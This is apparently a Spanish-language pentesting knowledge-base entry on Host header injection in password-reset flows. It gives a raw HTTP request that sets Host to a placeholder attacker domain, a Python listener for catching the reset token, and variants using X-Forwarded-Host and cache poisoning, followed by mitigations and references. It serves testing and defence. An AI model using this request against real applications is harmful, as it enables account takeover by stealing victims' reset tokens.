---
topic: Host header injection en recuperación de contraseña
tags: [web, host-header, password-reset, cache]
---

# Host header injection en recuperación de contraseña

[🌐 English](host-header-password-reset.en.md) | **Español**

## Concepto

Si una aplicación construye el enlace de recuperación con la cabecera `Host`, un atacante puede enviar la solicitud con su propio dominio. La víctima recibe un enlace válido que apunta al atacante, quien captura el token.

## Cuándo aplica

- El formulario de recuperación envía un correo con un enlace.
- El dominio del enlace no está fijado en la configuración.
- La aplicación acepta un `Host` arbitrario.

## Procedimiento

1. Solicitar el reset con `Host: <ATTACKER>`.
2. Escuchar la petición de la víctima.
3. Extraer el token y usarlo.
4. Cambiar la contraseña y entrar.

```http
POST /forgot HTTP/1.1
Host: <ATTACKER>
Content-Type: application/x-www-form-urlencoded

username=victim
```

```bash
python3 -m http.server 80
```

## Variantes

- Añadir `X-Forwarded-Host` si `Host` está validado.
- Envenenar la caché para servir la sesión de la víctima.
- Combinar con un dominio que resuelva al atacante.

## Limitaciones

- La aplicación debe usar la cabecera.
- El correo debe enviarse a una víctima real.
- El token debe seguir siendo válido.

## Mitigación y detección

- Fijar el dominio del reset en la configuración.
- Validar `Host` contra una allowlist.
- No cachear respuestas autenticadas.

## Referencias

- <https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection>
- <https://portswigger.net/web-security/host-header>
- <https://attack.mitre.org/techniques/T1556/>
